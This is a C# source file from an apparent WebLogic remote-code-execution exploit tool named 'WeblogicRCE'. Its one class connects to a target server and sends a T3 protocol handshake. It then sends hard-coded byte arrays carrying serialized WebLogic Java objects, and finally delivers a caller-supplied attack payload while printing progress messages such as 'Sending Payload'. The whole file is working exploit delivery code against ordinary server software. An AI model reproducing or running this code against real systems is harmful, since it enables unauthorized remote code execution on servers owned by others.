using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace WeblogicRCE
{
    class SocketNet
    {
        public static string socketnet(string ip, int port, byte[] payload)
        {
            string recStr_3 = "";
            IPEndPoint ipe = new IPEndPoint(IPAddress.Parse(ip), port);

            Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            clientSocket.Connect(ipe);

            byte[] T3_Handshake = { /* Packet 153 */ 0x74, 0x33, 0x20, 0x31, 0x32, 0x2e, 0x32, 0x2e, 0x31, 0x0a, 0x41, 0x53, 0x3a, 0x32, 0x35, 0x35, 0x0a, 0x48, 0x4c, 0x3a, 0x31, 0x39, 0x0a, 0x4d, 0x53, 0x3a, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x0a, 0x0a };
            Console.WriteLine("  [>] Sending Payload");
            clientSocket.Send(T3_Handshake);
            Thread.Sleep(1000);

            string recStr_1 = "";
            byte[] recBytes_1 = new byte[2048];
            int bytes_1 = clientSocket.Receive(recBytes_1, recBytes_1.Length, 0);
            recStr_1 += Encoding.ASCII.GetString(recBytes_1, 0, bytes_1);
            if (recStr_1.Contains("HELO"))
            {
                Console.WriteLine("  [>] Handshake Success");
                Thread.Sleep(1000);
                byte[] peer0_1 = { 0x00, 0x00, 0x05, 0xc3, 0x01, 0x65, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x6a, 0x00, 0x00, 0xea, 0x60, 0x00, 0x00, 0x00, 0x19, 0x00, 0x93, 0x7b, 0x48, 0x4a, 0x56, 0xfa, 0x4a, 0x77, 0x76, 0x66, 0xf5, 0x81, 0xda, 0xa4, 0xf5, 0xb9, 0x0e, 0x2a, 0xeb, 0xfc, 0x60, 0x74, 0x99, 0xb4, 0x02, 0x79, 0x73, 0x72, 0x00, 0x78, 0x72, 0x01, 0x78, 0x72, 0x02, 0x78, 0x70, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x70, 0x70, 0x70, 0x70, 0x70, 0x70, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x70, 0x06, 0xfe, 0x01, 0x00, 0x00, 0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x1d, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x72, 0x6a, 0x76, 0x6d, 0x2e, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x54, 0x61, 0x62, 0x6c, 0x65, 0x45, 0x6e, 0x74, 0x72, 0x79, 0x2f, 0x52, 0x65, 0x81, 0x57, 0xf4, 0xf9, 0xed, 0x0c, 0x00, 0x00, 0x78, 0x70, 0x72, 0x00, 0x24, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2e, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2e, 0x50, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x49, 0x6e, 0x66, 0x6f, 0xe6, 0xf7, 0x23, 0xe7, 0xb8, 0xae, 0x1e, 0xc9, 0x02, 0x00, 0x08, 0x49, 0x00, 0x05, 0x6d, 0x61, 0x6a, 0x6f, 0x72, 0x49, 0x00, 0x05, 0x6d, 0x69, 0x6e, 0x6f, 0x72, 0x49, 0x00, 0x0c, 0x72, 0x6f, 0x6c, 0x6c, 0x69, 0x6e, 0x67, 0x50, 0x61, 0x74, 0x63, 0x68, 0x49, 0x00, 0x0b, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x50, 0x61, 0x63, 0x6b, 0x5a, 0x00, 0x0e, 0x74, 0x65, 0x6d, 0x70, 0x6f, 0x72, 0x61, 0x72, 0x79, 0x50, 0x61, 0x74, 0x63, 0x68, 0x4c, 0x00, 0x09, 0x69, 0x6d, 0x70, 0x6c, 0x54, 0x69, 0x74, 0x6c, 0x65, 0x74, 0x00, 0x12, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0x4c, 0x00, 0x0a, 0x69, 0x6d, 0x70, 0x6c, 0x56, 0x65, 0x6e, 0x64, 0x6f, 0x72, 0x71, 0x00, 0x7e, 0x00, 0x03, 0x4c, 0x00, 0x0b, 0x69, 0x6d, 0x70, 0x6c, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x71, 0x00, 0x7e, 0x00, 0x03, 0x78, 0x70, 0x77, 0x02, 0x00, 0x00, 0x78, 0xfe, 0x01, 0x00, 0x00, 0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x1d, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x72, 0x6a, 0x76, 0x6d, 0x2e, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x54, 0x61, 0x62, 0x6c, 0x65, 0x45, 0x6e, 0x74, 0x72, 0x79, 0x2f, 0x52, 0x65, 0x81, 0x57, 0xf4, 0xf9, 0xed, 0x0c, 0x00, 0x00, 0x78, 0x70, 0x72, 0x00, 0x24, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2e, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2e, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x97, 0x22, 0x45, 0x51, 0x64, 0x52, 0x46, 0x3e, 0x02, 0x00, 0x03, 0x5b, 0x00, 0x08, 0x70, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x73, 0x74, 0x00, 0x27, 0x5b, 0x4c, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2f, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2f, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2f, 0x50, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x49, 0x6e, 0x66, 0x6f, 0x3b, 0x4c, 0x00, 0x0e, 0x72, 0x65, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x74, 0x00, 0x12, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0x5b, 0x00, 0x12, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x41, 0x73, 0x42, 0x79, 0x74, 0x65, 0x73, 0x74, 0x00, 0x02, 0x5b, 0x42, 0x78, 0x72, 0x00, 0x24, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2e, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2e, 0x50, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x49, 0x6e, 0x66, 0x6f, 0xe6, 0xf7, 0x23, 0xe7, 0xb8, 0xae, 0x1e, 0xc9, 0x02, 0x00, 0x08, 0x49, 0x00, 0x05, 0x6d, 0x61, 0x6a, 0x6f, 0x72, 0x49, 0x00, 0x05, 0x6d, 0x69, 0x6e, 0x6f, 0x72, 0x49, 0x00, 0x0c, 0x72, 0x6f, 0x6c, 0x6c, 0x69, 0x6e, 0x67, 0x50, 0x61, 0x74, 0x63, 0x68, 0x49, 0x00, 0x0b, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x50, 0x61, 0x63, 0x6b, 0x5a, 0x00, 0x0e, 0x74, 0x65, 0x6d, 0x70, 0x6f, 0x72, 0x61, 0x72, 0x79, 0x50, 0x61, 0x74, 0x63, 0x68, 0x4c, 0x00, 0x09, 0x69, 0x6d, 0x70, 0x6c, 0x54, 0x69, 0x74, 0x6c, 0x65, 0x71, 0x00, 0x7e, 0x00, 0x04, 0x4c, 0x00, 0x0a, 0x69, 0x6d, 0x70, 0x6c, 0x56, 0x65, 0x6e, 0x64, 0x6f, 0x72, 0x71, 0x00, 0x7e, 0x00, 0x04, 0x4c, 0x00, 0x0b, 0x69, 0x6d, 0x70, 0x6c, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x71, 0x00, 0x7e, 0x00, 0x04, 0x78, 0x70, 0x77, 0x02, 0x00, 0x00, 0x78, 0xfe, 0x01, 0x00, 0x00, 0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x1d, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x72, 0x6a, 0x76, 0x6d, 0x2e, 0x43, 0x6c, 0x61, 0x73, 0x73, 0x54, 0x61, 0x62, 0x6c, 0x65, 0x45, 0x6e, 0x74, 0x72, 0x79, 0x2f, 0x52, 0x65, 0x81, 0x57, 0xf4, 0xf9, 0xed, 0x0c, 0x00, 0x00, 0x78, 0x70, 0x72, 0x00, 0x21, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2e, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2e, 0x50, 0x65, 0x65, 0x72, 0x49, 0x6e, 0x66, 0x6f, 0x58, 0x54, 0x74, 0xf3, 0x9b, 0xc9, 0x08, 0xf1, 0x02, 0x00, 0x06, 0x49, 0x00, 0x05, 0x6d, 0x61, 0x6a, 0x6f, 0x72, 0x49, 0x00, 0x05, 0x6d, 0x69, 0x6e, 0x6f, 0x72, 0x49, 0x00, 0x0c, 0x72, 0x6f, 0x6c, 0x6c, 0x69, 0x6e, 0x67, 0x50, 0x61, 0x74, 0x63, 0x68, 0x49, 0x00, 0x0b, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x50, 0x61, 0x63, 0x6b, 0x5a, 0x00, 0x0e, 0x74, 0x65, 0x6d, 0x70, 0x6f, 0x72, 0x61, 0x72, 0x79, 0x50, 0x61, 0x74, 0x63, 0x68, 0x5b, 0x00, 0x08, 0x70, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x73, 0x74, 0x00, 0x27, 0x5b, 0x4c, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2f, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2f, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2f, 0x50, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x49, 0x6e, 0x66, 0x6f, 0x3b, 0x78, 0x72, 0x00, 0x24, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2e, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2e, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x97, 0x22, 0x45, 0x51, 0x64, 0x52, 0x46, 0x3e, 0x02, 0x00, 0x03, 0x5b, 0x00, 0x08, 0x70, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x73, 0x71 };
                byte[] peer0_2 = { 0x00, 0x7e, 0x00, 0x03, 0x4c, 0x00, 0x0e, 0x72, 0x65, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x74, 0x00, 0x12, 0x4c, 0x6a, 0x61, 0x76, 0x61, 0x2f, 0x6c, 0x61, 0x6e, 0x67, 0x2f, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x3b, 0x5b, 0x00, 0x12, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x41, 0x73, 0x42, 0x79, 0x74, 0x65, 0x73, 0x74, 0x00, 0x02, 0x5b, 0x42, 0x78, 0x72, 0x00, 0x24, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2e, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x6e, 0x61, 0x6c, 0x2e, 0x50, 0x61, 0x63, 0x6b, 0x61, 0x67, 0x65, 0x49, 0x6e, 0x66, 0x6f, 0xe6, 0xf7, 0x23, 0xe7, 0xb8, 0xae, 0x1e, 0xc9, 0x02, 0x00, 0x08, 0x49, 0x00, 0x05, 0x6d, 0x61, 0x6a, 0x6f, 0x72, 0x49, 0x00, 0x05, 0x6d, 0x69, 0x6e, 0x6f, 0x72, 0x49, 0x00, 0x0c, 0x72, 0x6f, 0x6c, 0x6c, 0x69, 0x6e, 0x67, 0x50, 0x61, 0x74, 0x63, 0x68, 0x49, 0x00, 0x0b, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x50, 0x61, 0x63, 0x6b, 0x5a, 0x00, 0x0e, 0x74, 0x65, 0x6d, 0x70, 0x6f, 0x72, 0x61, 0x72, 0x79, 0x50, 0x61, 0x74, 0x63, 0x68, 0x4c, 0x00, 0x09, 0x69, 0x6d, 0x70, 0x6c, 0x54, 0x69, 0x74, 0x6c, 0x65, 0x71, 0x00, 0x7e, 0x00, 0x05, 0x4c, 0x00, 0x0a, 0x69, 0x6d, 0x70, 0x6c, 0x56, 0x65, 0x6e, 0x64, 0x6f, 0x72, 0x71, 0x00, 0x7e, 0x00, 0x05, 0x4c, 0x00, 0x0b, 0x69, 0x6d, 0x70, 0x6c, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x71, 0x00, 0x7e, 0x00, 0x05, 0x78, 0x70, 0x77, 0x02, 0x00, 0x00, 0x78, 0xfe, 0x00, 0xff, 0xfe, 0x01, 0x00, 0x00, 0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x13, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x72, 0x6a, 0x76, 0x6d, 0x2e, 0x4a, 0x56, 0x4d, 0x49, 0x44, 0xdc, 0x49, 0xc2, 0x3e, 0xde, 0x12, 0x1e, 0x2a, 0x0c, 0x00, 0x00, 0x78, 0x70, 0x77, 0x50, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x31, 0x39, 0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x2e, 0x32, 0x32, 0x37, 0x00, 0x12, 0x57, 0x49, 0x4e, 0x2d, 0x41, 0x47, 0x44, 0x4d, 0x56, 0x51, 0x55, 0x42, 0x31, 0x54, 0x36, 0x2e, 0x65, 0x68, 0x83, 0x34, 0x8c, 0xd6, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x1b, 0x59, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x78, 0xfe, 0x01, 0x00, 0x00, 0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x13, 0x77, 0x65, 0x62, 0x6c, 0x6f, 0x67, 0x69, 0x63, 0x2e, 0x72, 0x6a, 0x76, 0x6d, 0x2e, 0x4a, 0x56, 0x4d, 0x49, 0x44, 0xdc, 0x49, 0xc2, 0x3e, 0xde, 0x12, 0x1e, 0x2a, 0x0c, 0x00, 0x00, 0x78, 0x70, 0x77, 0x20, 0x01, 0x14, 0xdc, 0x42, 0xbd, 0x07 };
                byte[] peer0_3 = { 0x1a, 0x77, 0x27, 0x00, 0x0d, 0x32, 0x34, 0x32, 0x2e, 0x32, 0x31, 0x34 };
                byte[] peer0_4 = { 0x2e, 0x31, 0x2e, 0x32, 0x35, 0x34, 0x61, 0x86, 0x3d, 0x1d, 0x00, 0x00, 0x00, 0x00, 0x78 };

                clientSocket.Send(peer0_1);
                clientSocket.Send(peer0_2);
                clientSocket.Send(peer0_3);
                clientSocket.Send(peer0_4);
                Thread.Sleep(1000);
                string recStr_2 = "";
                byte[] recBytes_2 = new byte[2048];
                int bytes_2 = clientSocket.Receive(recBytes_2, recBytes_2.Length, 0);
                recStr_2 += Encoding.ASCII.GetString(recBytes_2, 0, bytes_2);
                Console.WriteLine("  [>] Send request payload successful, recv length: " + recStr_2.Length);

                clientSocket.Send(payload);
                Thread.Sleep(1000);
                byte[] recBytes_3 = new byte[4096];
                int bytes_3 = clientSocket.Receive(recBytes_3, recBytes_3.Length, 0);
                recStr_3 += Encoding.ASCII.GetString(recBytes_3, 0, bytes_3);
            }
            else
            {
                Console.WriteLine("  [>] Handshake Failure");
            }
            return recStr_3;
        }
    }
}
